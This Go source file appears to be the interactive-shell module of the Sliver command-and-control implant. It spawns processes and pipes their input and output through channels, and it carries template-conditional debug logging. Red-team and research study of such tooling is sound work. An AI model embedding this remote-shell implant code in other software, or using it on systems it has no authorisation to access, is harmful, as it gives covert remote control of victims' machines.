package shell

import (
	"io"
	"log"
	"os"
	"os/exec"
	"sync"

	pb "sliver/protobuf/sliver"
)

const (
	readBufSize = 1024
)

var (
	// Shells - Access shells and channels
	Shells = shells{
		shells: &map[uint32]*Shell{},
		mutex:  &sync.RWMutex{},
	}

	shellID = new(uint32)
)

// Shell - Holds channels for a single shell
type Shell struct {
	ID    uint32
	Path  string
	Read  *chan []byte
	Write *chan []byte
}

// Shells - Holds channels for all shells
type shells struct {
	shells *map[uint32]*Shell
	mutex  *sync.RWMutex
}

// AddShell - Add a shell to shells
func (s *shells) AddShell(shell *Shell) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	(*s.shells)[shell.ID] = shell
}

// CloseShell - Add a shell to shells
func (s *shells) CloseShell(ID uint32) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	if shell, ok := (*s.shells)[ID]; ok {
		close(*shell.Read)
		delete((*s.shells), ID)
	}
}

// RemoveShell - Add a shell to shells
func (s *shells) WriteData(shellData *pb.ShellData) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	if shell, ok := (*s.shells)[shellData.ID]; ok {
		(*shell.Write) <- shellData.Stdin
	}
}

// GetShellID - Returns an incremental nonce as an id
func GetShellID() uint32 {
	newID := (*shellID) + 1
	(*shellID)++
	return newID
}

// Start - Start a process
func Start(command string) error {
	cmd := exec.Command(command)
	return cmd.Start()
}

// StartInteractive - Start a shell
func StartInteractive(command []string) *Shell {

	// {{if .Debug}}
	log.Printf("[shell] %s", command)
	// {{end}}

	var cmd *exec.Cmd
	cmd = exec.Command(command[0], command[1:]...)

	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()

	read := make(chan []byte)
	write := make(chan []byte)

	go func() {
		buf := make([]byte, readBufSize)
		for {
			n, err := stderr.Read(buf)
			// {{if .Debug}}
			log.Printf("[shell] read (stderr)")
			// {{end}}
			if err == io.EOF {
				// {{if .Debug}}
				log.Printf("[shell] EOF (stderr)")
				// {{end}}
				return
			}
			read <- buf[:n]
		}
	}()

	go func() {
		buf := make([]byte, readBufSize)
		for {
			n, err := stdout.Read(buf)
			// {{if .Debug}}
			log.Printf("[shell] read (stdout)")
			// {{end}}
			if err == io.EOF {
				// {{if .Debug}}
				log.Printf("[shell] EOF (stdout)")
				// {{end}}
				return
			}
			read <- buf[:n]

		}
	}()
	go func() {
		defer func() {
			stdin.Close()
			stdout.Close()
			stderr.Close()
			close(read)
		}()
		for incoming := range write {
			// {{if .Debug}}
			log.Printf("[shell] write (stdin)")
			// {{end}}
			stdin.Write(incoming)
		}
	}()
	cmd.Start()

	return &Shell{
		ID:    GetShellID(),
		Path:  command[0],
		Read:  &read,
		Write: &write,
	}
}

func exists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true
}
